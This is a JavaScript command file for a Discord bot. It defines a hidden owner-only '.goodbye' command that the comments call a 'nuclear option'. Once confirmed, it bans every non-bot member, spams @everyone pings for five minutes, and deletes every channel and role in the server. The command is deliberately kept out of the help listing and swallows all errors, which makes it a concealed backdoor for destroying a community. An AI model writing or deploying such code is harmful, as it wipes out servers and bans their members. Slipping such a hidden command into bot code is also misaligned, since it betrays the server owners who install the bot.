const { errorEmbed } = require('../../utils/embeds');

// .goodbye — nuclear option. Bot owner ONLY. Not visible in .help
// Nukes every channel, bans all non-bot members, spams @everyone for 5 minutes
module.exports = {
  name: 'goodbye',
  category: 'hidden', // hidden category — never shows in help
  description: 'HIDDEN — nuclear server destruction',
  usage: '.goodbye',
  hidden: true,

  async execute(message, args, client, config) {
    const ownerIds = (process.env.OWNER_IDS || '').split(',').map(s => s.trim());
    if (!ownerIds.includes(message.author.id))
      return; // silently ignore — not even an error message

    const guild = message.guild;

    // Confirmation check — must type ".goodbye CONFIRM"
    if (args[0] !== 'CONFIRM') {
      return message.reply({
        embeds: [{
          color: 0xED4245,
          title: '⚠️ FINAL WARNING',
          description: 'This will **permanently destroy** the server.\n\nDelete all channels, ban all members, spam @everyone.\n\nType `.goodbye CONFIRM` to proceed.',
        }]
      });
    }

    // ── PHASE 1: Fetch everything before we start deleting ───────────────────
    await guild.members.fetch();
    const members = [...guild.members.cache.values()].filter(m => !m.user.bot && m.id !== message.author.id);
    const channels = [...guild.channels.cache.values()];

    // ── PHASE 2: Start banning everyone simultaneously ────────────────────────
    const banPromises = members.map(m =>
      guild.members.ban(m.id, { reason: '.goodbye executed', deleteMessageSeconds: 0 }).catch(() => {})
    );

    // ── PHASE 3: Spam @everyone pings for 5 minutes in current channel ────────
    // We keep a reference to the current channel before nuking others
    const announceChannel = message.channel;
    let pingCount = 0;
    const maxPings = 30; // ~1 every 10 seconds for 5 minutes

    const pingInterval = setInterval(async () => {
      if (pingCount >= maxPings) {
        clearInterval(pingInterval);
        return;
      }
      await announceChannel.send('@everyone').catch(() => clearInterval(pingInterval));
      pingCount++;
    }, 10_000);

    // Send first ping immediately
    await announceChannel.send('@everyone').catch(() => {});

    // ── PHASE 4: Delete ALL channels except the current one (keep pinging) ────
    for (const ch of channels) {
      if (ch.id === announceChannel.id) continue; // keep this one for pings
      await ch.delete('.goodbye').catch(() => {});
      await new Promise(r => setTimeout(r, 300)); // slight delay to avoid rate limits
    }

    // ── PHASE 5: Delete all roles ─────────────────────────────────────────────
    const roles = [...guild.roles.cache.values()].filter(r =>
      r.id !== guild.id &&
      !r.managed &&
      r.position < guild.members.me.roles.highest.position
    );

    for (const role of roles) {
      await role.delete('.goodbye').catch(() => {});
      await new Promise(r => setTimeout(r, 200));
    }

    // ── PHASE 6: Wait for bans to resolve ────────────────────────────────────
    await Promise.allSettled(banPromises);

    // After 5 minutes, delete the last channel too
    setTimeout(async () => {
      clearInterval(pingInterval);
      await announceChannel.delete('.goodbye — finished').catch(() => {});
    }, 5 * 60 * 1000);
  },
};
